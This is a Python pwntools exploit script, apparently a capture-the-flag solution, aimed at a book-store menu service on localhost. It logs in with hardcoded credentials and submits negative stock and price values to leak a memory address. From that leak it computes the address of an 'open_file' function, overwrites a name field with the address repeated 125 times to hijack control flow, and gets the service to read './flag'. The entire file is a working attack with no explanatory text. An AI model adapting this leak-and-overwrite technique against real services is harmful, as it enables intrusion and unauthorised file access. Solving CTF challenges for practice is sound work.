from pwn import *

def recv (conn, times):
  for i in range(times):
    print conn.recv (timeout = 1)

conn = remote ("localhost", 1984)

recv (conn, 1)
conn.sendline("helloadmin")
log.info ("Sended ID")

recv (conn, 1)
conn.sendline("iulover!@#$")
log.info ("Sended Password")

recv (conn, 2)
conn.sendline("1");
log.info ("Sended 1")

recv (conn, 1)
conn.sendline("Name")
log.info ("Sended filename")

recv (conn, 2)
conn.sendline("Description")
log.info ("Sended description")

recv (conn, 3)
conn.sendline ("0")
log.info ("Sended type (0)")

recv (conn, 3)
conn.sendline ("2")
log.info ("Sended 2")

recv (conn, 3)
conn.sendline ("0") #Book num
log.info ("Sended Book Number")

recv (conn, 3)
conn.sendline ("3") #Modify information
log.info ("Sended 3 (Modify information)")

recv (conn, 3)
conn.sendline ("-1") #Stock
log.info ("Sended Stock -1")

recv (conn, 3)
conn.sendline ("-1") #Price
log.info ("Sended Price -1")

recv (conn, 3)
conn.sendline ("0") #No freeshiping
log.info ("Sended 0 (No freeshiping)")

recv (conn, 3)
conn.sendline ("1") #Available
log.info ("Sended 1 (Available)")

recv (conn, 3)
conn.sendline ("A"*30)
log.info ("Sended A 30 times")

recv (conn, 3)
conn.sendline ("Description")
log.info ("Sended Description")

recv (conn, 3)
conn.sendline ("0")
log.info ("Sended 0 (Back to main menu)")

recv (conn, 3)
conn.sendline ("4") #Show name!
log.info ("Sended 4 (Show all)")

conn.recvuntil ("\xff\xff\xff\xff\xff\xff\xff\xff")
memleak = conn.recv (timeout = 1)
#leakaddr = memleak.encode ("hex")[:8]
#leakaddr = leakaddr[6:8] + leakaddr[4:6] + leakaddr[2:4] + leakaddr[0:2]

leakaddr = hex(u32(memleak[:4]))
log.info ("Leak addr: " + leakaddr)

funcaddr_int = int (leakaddr, 16) - 0xd2
funcaddr = p32 (funcaddr_int)
#funcaddr = funcaddr[6:8] + funcaddr[4:6] + funcaddr[2:4] + funcaddr[0:2]
#funcaddr_encoded = funcaddr.decode ("hex")

log.info ("Address of open_file: " + hex(funcaddr_int))

recv (conn, 3)
conn.sendline ("2")
log.info ("Sended 2 (Modify)")

recv (conn, 3)
conn.sendline ("0")
log.info ("Sended 0 (Book Number)")

recv (conn, 3)
conn.sendline ("1")
log.info ("Sended 1 (Modify Name)")

recv (conn, 3)
conn.sendline (funcaddr * 125)
log.info ("Sended funaddr 125 times: " + funcaddr)

recv (conn, 3)
conn.sendline ("3")
log.info ("Sended (Modify Information)")

recv (conn, 3)
conn.sendline ("-1") #Stock
log.info ("Sended Stock -1")

recv (conn, 3)
conn.sendline ("-1") #Price
log.info ("Sended Price -1")

recv (conn, 3)
conn.sendline ("0") #No freeshiping
log.info ("Sended 0 (No freeshiping)")

recv (conn, 3)
conn.sendline ("1") #Available
log.info ("Sended 1 (Available)")

recv (conn, 3)
conn.send ("./flag")
log.info ("Sended ./flag (File Name)")

recv (conn, 3)
conn.sendline ("Description")
log.info ("Sended Description")

recv (conn, 3)
conn.sendline ("4")
log.info ("Sended 4 (Modify Shipping)")

recv (conn, 3)
conn.sendline ("1")
log.info ("Sended 1 (Free-Shipping)")

recv (conn, 3)
conn.sendline ("0")
log.info ("Sended 0 (Back to main menu)")

recv (conn, 3)
conn.sendline ("4")
log.info ("Sended 4 (Print Name)")

recv (conn, 3)
conn.sendline ("3")
log.info ("Sended 3 (Print Book)")

recv (conn, 3)
conn.sendline ("0")
log.info ("Sended 0 (Book Number)")

recv (conn, 4)

conn.close ()

#print conn.recvline (timeout = 1)
